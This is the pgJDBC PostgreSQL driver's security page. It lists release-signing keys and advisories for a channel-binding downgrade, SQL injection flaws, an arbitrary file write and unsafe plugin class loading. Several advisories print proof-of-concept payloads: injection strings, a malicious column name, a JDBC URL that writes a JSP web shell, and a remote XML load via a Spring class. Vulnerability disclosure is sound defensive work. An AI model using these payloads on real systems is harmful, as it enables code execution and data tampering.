---
title: "Security"
date: 2024-02-21T11:58:00-05:00
draft: false
---

## Release verification

For security purposes, we sign our releases with these PGP keys:
* Versions before 42.7.8:
  * Key ID: `davecramer@gmail.com`
  * Fingerprint: **3750 777B 9C4B 7D23 3B9D 0C40 307A 96FB A029 2109**
  * Key size: RSA 4096
* Versions before 42.7.8:
  * Key ID: `sitnikov.vladimir@gmail.com`
  * Fingerprint: **1A60 90D3 223D CA95 BFD2 5C0E 38F4 7D3E 410C 47B1**
  * Key size: RSA 2048
* Versions since 42.7.8:
  * Key ID: `pgjdbc-releases@jdbc.postgresql.org`
  * Fingerprint: **86C0 1449 0973 9E0E E3D1  B545 305F 296E AC47 556B**
  * Key size: RSA 4096

## Security Advisories

### Silent channel-binding authentication downgrade (CVE-2026-54291)

#### Impact

`channelBinding=require` connections can be silently downgraded from `SCRAM-SHA-256-PLUS` (with channel binding) to plain `SCRAM-SHA-256` (without it), losing the man-in-the-middle protection the setting is meant to guarantee. An attacker who can intercept the TLS connection triggers the downgrade with a certificate whose signature algorithm has no `tls-server-end-point` channel-binding hash. Examples are Ed25519, Ed448, and post-quantum algorithms.

Two issues combine in releases 42.7.4 through 42.7.11:

1. The bundled `com.ongres.scram:scram-client` (3.1 or 3.2) returns an empty byte array instead of failing when it cannot derive the binding hash for such a certificate. This is the library issue tracked as [CVE-2026-53712](https://github.com/advisories/GHSA-p9jg-fcr6-3mhf).
2. pgJDBC does not enforce `channelBinding=require` where it matters. `ScramAuthenticator` checks only that the server *advertised* a `-PLUS` mechanism; it neither rejects the empty binding nor checks that the *negotiated* mechanism uses channel binding. The connection therefore downgrades silently.

Only connections that set `channelBinding=require` are affected. Under the default `prefer` policy, and under `allow` or `disable`, falling back to plain SCRAM is the documented behaviour. Releases before 42.7.4 are unaffected, because they do not support channel binding.

#### Patches

Fixed in pgJDBC 42.7.12. The driver now enforces channel binding in its own code, independently of the `scram-client` version:

- Under `channelBinding=require`, it fails the connection when no channel-binding data can be extracted from the server certificate, instead of passing an empty value to the SCRAM client. The error names the certificate signature algorithm.
- After negotiation, it requires the selected mechanism to use channel binding (a `-PLUS` mechanism) whenever `channelBinding=require` is set, regardless of how negotiation resolved.

Upgrade to 42.7.12 or later.

#### Workarounds

No pgJDBC setting restores channel-binding enforcement on an affected release; upgrading is the fix.

If you cannot upgrade immediately, verify the server certificate at the TLS layer so that a man-in-the-middle cannot present a substitute certificate. Set `sslmode=verify-full` with a truststore that contains only your server's CA. This defence is independent of channel binding and blocks the same attacker.

Reported by [KEIJOT](https://github.com/KEIJOT)

See the [Security Advisory](https://github.com/pgjdbc/pgjdbc/security/advisories/GHSA-j92g-9f8w-j867) for full detail.

### SQL Injection via line comment generation

#### Impact

SQL injection is possible when using the non-default connection property preferQueryMode=simple in combination with application code that has a vulnerable SQL that negates a parameter value.

There is no vulnerability in the driver when using the default query mode. Users that do not override the query mode are not impacted.


#### Exploitation

To exploit this behavior the following conditions must be met:

A placeholder for a numeric value must be immediately preceded by a minus (i.e. -)
There must be a second placeholder for a string value after the first placeholder on the same line.
Both parameters must be user controlled.
The prior behavior of the driver when operating in simple query mode would inline the negative value of the first parameter and cause the resulting line to be treated as a -- SQL comment. That would extend to the beginning of the next parameter and cause the quoting of that parameter to be consumed by the comment line. If that string parameter includes a newline, the resulting text would appear unescaped in the resulting SQL.

When operating in the default extended query mode this would not be an issue as the parameter values are sent separately to the server. Only in simple query mode the parameter values are inlined into the executed SQL causing this issue.

#### Example

```java
PreparedStatement stmt = conn.prepareStatement("SELECT -?, ?");
stmt.setInt(1, -1);
stmt.setString(2, "\nWHERE false --");
ResultSet rs = stmt.executeQuery();
The resulting SQL when operating in simple query mode would be:
```

```sql
SELECT --1,'
WHERE false --'
The contents of the second parameter get injected into the command. Note how both the number of result columns and the WHERE clause of the command have changed. A more elaborate example could execute arbitrary other SQL commands.
```

#### Workarounds

Do not use the connection `propertypreferQueryMode=simple`. 
(NOTE: If you do not explicitly specify a query mode then you are using the default of extended and are not impacted by this issue.)

#### Patched

Patched in versions 42.7.2, 42.6.1, 42.5.5, 42.4.4, 42.3.9, 42.2.28, and 42.2.28-jre7

No patch available for 42.2.26-jre6

Reported by [Paul Gerste](https://github.com/paul-gerste-sonarsource)

### SQL Injection in ResultSet.refreshRow() with malicious column names

#### Impact

*What kind of vulnerability is it? Who is impacted?*

The PGJDBC implementation of the `java.sql.ResultRow.refreshRow()` method is not performing escaping of column names so a malicious column name that contains a statement terminator, e.g. ; , could lead to SQL injection. This could lead to executing additional SQL commands as the application's JDBC user.

User applications that do not invoke the `ResultSet.refreshRow()` method are not impacted.

User application that do invoke that method are impacted if the underlying database that they are querying via their JDBC application may be under the control of an attacker. The attack requires the attacker to trick the user into executing SQL against a table name who's column names would contain the malicious SQL and subsequently invoke the `refreshRow()` method on the ResultSet.

For example:

```sql
CREATE TABLE refresh_row_example (
  id     int PRIMARY KEY,
  "1 FROM refresh_row_example; SELECT pg_sleep(10); SELECT * " int
);
```

This example has a table with two columns. The name of the second column is crafted to contain a statement terminator followed by additional SQL. Invoking the `ResultSet.refreshRow()` on a ResultSet that queried this table, e.g. `SELECT * FROM refresh_row` , would cause the additional SQL commands such as the `SELECT pg_sleep(10)` invocation to be executed.

As the multi statement command would contain multiple results, it would not be possible for the attacker to get data directly out of this approach as the `ResultSet.refreshRow()` method would throw an exception. However, the attacker could execute any arbitrary SQL including inserting the data into another table that could then be read or any other DML / DDL statement.

Note that the application's JDBC user and the schema owner need not be the same. A JDBC application that executes as a privileged user querying database schemas owned by potentially malicious less-privileged users would be vulnerable. In that situation it may be possible for the malicious user to craft a schema that causes the application to execute commands as the privileged user.

#### Patches

*Has the problem been patched? What versions should users upgrade to?*

Yes, versions 42.2.26 and 42.4.1 have been released with a fix.

The 42.2.26 release was provided to support older clients that are still running JDK 6 or JDK 7 that cannot upgrade to the 42.4.x release line (which requires JDK 8+).

We are not releasing a version for the 43.3.x release line and users are advised to upgrade to the 42.4.1 release to get the fix.

#### Workarounds

*Is there a way for users to fix or remediate the vulnerability without upgrading?*

Check that you are not using the `ResultSet.refreshRow()` method.

If you are, ensure that the code that executes that method does not connect to a database that is controlled by an unauthenticated or malicious user. If your application only connects to its own database with a fixed schema with no DDL permissions, then you will not be affected by this vulnerability as it requires a maliciously crafted schema.

### Arbitrary File Write Vulnerability

#### Overview

The connection properties for configuring a pgjdbc connection are not meant to be exposed to an unauthenticated attacker. While allowing an attacker to specify arbitrary connection properties could lead to a compromise of a system, that's a defect of an application that allows unauthenticated attackers that level of control.

It's not the job of the pgjdbc driver to decide whether a given log file location is acceptable. End user applications that use the pgjdbc driver must ensure that filenames are valid and restrict unauthenticated attackers from being able to supply arbitrary values. That's not specific to the pgjdbc driver either, it would be true for any library that can write to the application's local file system.

While we do not consider this a security issue with the driver, we have decided to remove the loggerFile and loggerLevel connection properties in the next release of the driver. Removal of those properties does not make exposing the JDBC URL or connection properties to an attacker safe and we continue to suggest that applications do not allow untrusted users to specify arbitrary connection properties. We are removing them to prevent misuse and their functionality can be delegated to java.util.logging.

If you identify an application that allows remote users to specify a complete JDBC URL or properties without validating it's contents, we encourage you to notify the application owner as that may be a security defect in that specific application.

#### Impact

It is possible to specify an arbitrary filename in the loggerFileName connection parameter
 `"jdbc:postgresql://localhost:5432/test?user=test&password=test&loggerLevel=DEBUG&loggerFile=./blah.jsp&<%Runtime.getRuntime().exec(request.getParameter("i"));%>"`

This creates a valid JSP file which could lead to a Remote Code Execution

#### Patches

As of version 42.3.3 loggerFile is ignored by the driver.

#### Workarounds

upgrade to latest version.

Reported by Allan Lou v3ged0ge@gmail.com

### Unchecked Class Instantiation when providing Plugin Classes

#### Impact

pgjdbc instantiates plugin instances based on class names provided via `authenticationPluginClassName`, `sslhostnameverifier`, `socketFactory`, `sslfactory`, `sslpasswordcallback` connection properties.

However, the driver did not verify if the class implements the expected interface before instantiating the class.

Here's an example attack using an out-of-the-box class from Spring Framework:

```java
DriverManager.getConnection("jdbc:postgresql://node1/test?socketFactory=org.springframework.context.support. ClassPathXmlApplicationContext&socketFactoryArg=http://target/exp.xml");
```

The first impacted version is REL9.4.1208 (it introduced `socketFactory` connection property)
